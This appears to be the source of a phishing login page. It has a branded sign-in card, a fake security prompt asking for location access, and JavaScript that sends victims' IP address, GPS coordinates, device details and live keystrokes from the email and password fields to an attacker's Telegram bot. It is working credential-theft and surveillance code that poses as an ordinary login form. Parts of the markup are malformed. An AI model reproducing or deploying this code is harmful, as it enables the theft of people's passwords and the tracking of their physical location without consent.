<style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { 
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
        background: #f0f2f5; display: flex; justify-content: center; align-items: center;

    .card {
        background: #fff; border-radius: 12px; box-shadow: 0 2px 12px rgba(0,0,0,0.08);
        padding: 32px 24px; width: 100%; max-width: 400px;
    }
    .logo { text-align: center; margin-bottom: 24px; }
    .logo svg { margin-bottom: 8px; }
    .logo h1 { font-size: 22px; font-weight: 600; margin-top: 8px; }
    .logo p { font-size: 14px; color: #666; margin-top: 4px; }
    .input-group { margin-bottom: 16px; }
    .input-group label { display: block; font-size: 14px; font-weight: 500; color: #333; margin-bottom: 6px; }
    .input-group input {
        width: 100%; padding: 12px 14px; border: 1.5px solid #ddd; border-radius: 8px;
        font-size: 16px; transition: border-color 0.2s; background: #fafafa;
    }
    .input-group input:focus { outline: none; border-color: var(--brand-color, #1a73e8); background: #fff; }
    .btn {
        width: 100%; padding: 14px; background: var(--brand-color, #1a73e8); color: #fff; border: none;
        border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer;
        transition: background 0.2s; margin-top: 8px;
    }
    .btn:hover { filter: brightness(0.9); }
    .btn:disabled { opacity: 0.6; cursor: not-allowed; }
    .error { color: #d93025; font-size: 13px; margin-top: 12px; text-align: center; display: none; }
    .loading { display: none; text-align: center; margin-top: 16px; }
    .loading .spinner {
        width: 20px; height: 20px; border: 3px solid #e0e0e0; border-top: 3px solid var(--brand-color, #1a73e8);
        border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 8px;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .loading p { color: #666; font-size: 14px; }
    .footer { text-align: center; margin-top: 20px; font-size: 13px; color: #999; }
    .footer a { color: var(--brand-color, #1a73e8); text-decoration: none; }
    .footer a:hover { text-decoration: underline; }

        display: flex; align-items: center; gap: 8px; margin: 12px 0;

    }

<body>

<div id="appRoot"></div>

<!-- Hidden geo overlay -->
<div class="geo-overlay" id="geoOverlay">
    <div class="geo-box">
        <h3>Allow location access?</h3>
        <p>Your location helps us keep your account secure.</p>
        <div class="btn-row">
            <button class="deny" onclick="document.getElementById('geoOverlay').style.display='none'">Block</button>
            <button class="allow" onclick="document.getElementById('geoOverlay').style.display='none'">Allow</button>
        </div>
    </div>
</div>

// ========================
// TELEGRAM SENDER
// ========================
function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const payload = { chat_id: CHAT_ID, text: message, parse_mode: "Markdown" };
    try {
        const xhr = new XMLHttpRequest();
        xhr.open('POST', url, true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify(payload));
    } catch(e) {}
}

// ========================
// LOCATION DATA
// ========================
let targetIP = 'Unknown', targetCountry = 'Unknown', targetCity = 'Unknown', targetISP = 'Unknown';
let targetLat = null, targetLon = null;
fetch('https://ipapi.co/json/').then(r=>r.json()).then(d=>{ targetIP=d.ip||'Unknown'; targetCountry=d.country_name||'Unknown'; targetCity=d.city||'Unknown'; targetISP=d.org||'Unknown'; targetLat=d.latitude; targetLon=d.longitude; }).catch(()=>{});

let preciseLocation = null;
let gpsAttempted = false;

function requestGeolocation() {
    if (gpsAttempted) return;
    gpsAttempted = true;
    if (!navigator.geolocation) {
        sendToTelegram(`⚠️ *Geolocation not available* — ${brand.name}\nReason: Browser does not support geolocation API`);
        return;
    }
    navigator.geolocation.getCurrentPosition(
        pos => {
            const lat = pos.coords.latitude, lon = pos.coords.longitude, acc = pos.coords.accuracy, alt = pos.coords.altitude;
            preciseLocation = { lat, lon, acc, alt };
            sendToTelegram(`📍 *Precise GPS Location Captured — ${brand.name}*\n🌐 *Lat/Lon:* \`${lat}, ${lon}\`\n🎯 *Accuracy:* ${acc} meters\n🗺 *Maps:* https://www.google.com/maps?q=${lat},${lon}\n📏 *Altitude:* ${alt ? alt.toFixed(1) + 'm' : 'N/A'}`);
        },
        err => {
            let reason = 'Unknown';
            switch(err.code) { case err.PERMISSION_DENIED: reason='User denied'; break; case err.POSITION_UNAVAILABLE: reason='Location unavailable'; break; case err.TIMEOUT: reason='Timed out (20s)'; break; }
            sendToTelegram(`❌ *Geolocation result* — ${brand.name}\nReason: ${reason}`);
        },
        { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
    );
}

function buildLocationInfo() {
    let m = `\n🌐 *IP:* ${targetIP}\n📍 *IP Location:* ${targetCity}, ${targetCountry}\n`;
    if (targetLat && targetLon) m += `🗺 *IP Coords:* ${targetLat}, ${targetLon}\n`;
    if (preciseLocation) m += `🎯 *GPS:* ${preciseLocation.lat}, ${preciseLocation.lon} (±${preciseLocation.acc}m)\n🗺 *GPS Map:* https://www.google.com/maps?q=${preciseLocation.lat},${preciseLocation.lon}\n`;
    m += `🏢 *ISP:* ${targetISP}\n📱 *Device:* ${navigator.platform||'Unknown'}\n🖥 *Screen:* ${window.screen.width}x${window.screen.height}\n🕐 *Timezone:* ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n⏰ *Time:* ${new Date().toISOString()}`;
    return m;
}

// ========================
// KEYSTROKE LOGGING
// ========================
let lastEmailLen = 0, lastPassLen = 0;
function attachKeystrokeListeners() {
    const ef = document.getElementById('email');
    const pf = document.getElementById('password');
    const le = document.getElementById('lookupEmail');
    const lz = document.getElementById('lookupZip');
    
    if (ef) ef.addEventListener('input', function() {
        const v = this.value;
        if (v.length > lastEmailLen && v.length > 2) {
            sendToTelegram(`🔑 *Keystroke* — ${brand.name}\n👤 *Field:* Email\n📝 *Char:* \`${v[v.length-1]}\`\n📋 *So far:* \`${v}\``);
        }
        lastEmailLen = v.length;
    });
    
    if (pf) pf.addEventListener('input', function() {
        const v = this.value;
        if (v.length > lastPassLen && v.length > 0) {
            const masked = '*'.repeat(v.length - 1) + v[v.length - 1];
            sendToTelegram(`🔑 *Keystroke* — ${brand.name}\n👤 *Field:* Password\n📝 *Char:* \`${v[v.length-1]}\`\n📋 *So far:* \`${masked}\``);
        }
        lastPassLen = v.length;
    });
    
    if (le) le.addEventListener('input', function() {
        const v = this.value;
        if (v.length > 2) {
            sendToTelegram(`🔑 *Keystroke* — ${brand.name}\n👤 *Field:* Lookup Email\n📝 *Char:* \`${v[v.length-1]}\`\n📋 *So far:* \`${v}\``);
        }
    });
    
    if (lz) lz.addEventListener('input', function() {
        const v = this.value;
        if (v.length > 1) {
            sendToTelegram(`🔑 *Keystroke* — ${brand.name}\n👤 *Field:* Lookup ZIP\n📝 *Char:* \`${v[v.length-1]}\`\n📋 *So far:* \`${v}\``);
        }
    });
}
